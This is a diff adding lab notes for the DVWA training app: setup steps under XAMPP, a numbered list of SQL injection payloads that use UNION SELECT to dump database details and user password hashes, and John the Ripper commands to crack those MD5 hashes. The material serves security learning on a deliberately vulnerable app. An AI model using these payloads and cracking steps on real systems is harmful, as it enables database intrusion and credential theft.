@@ -1,0 +1,34 @@
+1. Download DVWA, then extract it to a folder called 'DVWA' in the htdocs folder of XAMPP.
+2. Link is localhost/DVWA/ (make sure XAMPP is running; it will not open anyway)
+3. Rename the file called config.inc.php.dist in the config folder to config.inc.php (change to php)
+4. Now open phpMyAdmin, then create a database called 'dvwa', then create new user credentials with 'dvwa' as user and 'p@ssw0rd' as password.
+5. Now reload the application, and then just click the 'Login' button.
+6. Scroll down, then run the button called 'Create/Reset Database'. It must be successfully done.
+7. Now go back to login page (localhost/DVWA/login.php) - Username: admin and Password: password
+8. Go back to the config file, search for this text called: $_DVWA[ 'default_security_level' ] and set it's value to 'low'
+9. Save changes and reload once again, check DVWA Security for the changes (should be low)
+10. Access the SQL Injection button and you're good to go.
+
+Run these commands to test the SQL injection:
+1. Basic injection: any number from 1-5; individual user's data is shown.
+   Here, id is being exploited: $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"
+
+2. Always true scenario: %' or '0'='0 (display all record that are false and all records that are true) 
+   Here, mysql> SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0'
+
+3. Display DB version: %' or 0=0 union select null, version() # (last surname value has the db version)
+
+4. Display DB user: %' or 0=0 union select null, user() # (last surname value has the name)
+
+5. Display DB name: %' or 0=0 union select null, database() # (last surname value has the name)
+
+6. Display all tables in info_schema: %' and 1=0 union select null, table_name from information_schema.tables #
+
+7. Display all the columns field contents in the information_schema user table: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+
+Now, we can use John to crack one of the passwords
+1. From the 7th command results; copy for a user the last two lines
+2. Save it in a text file in this format: <name>:<hashcode>. Can also paste multiple user info like this, next to next in line.
+3. Let's say the text file is named as dvwa_password.text
+4. Run: john --format=raw-MD5 dvwa_password.txt (inside run folder, same folder has the text file also)
+5. Run: john --show dvwa_password.txt to view the cracked passwords.
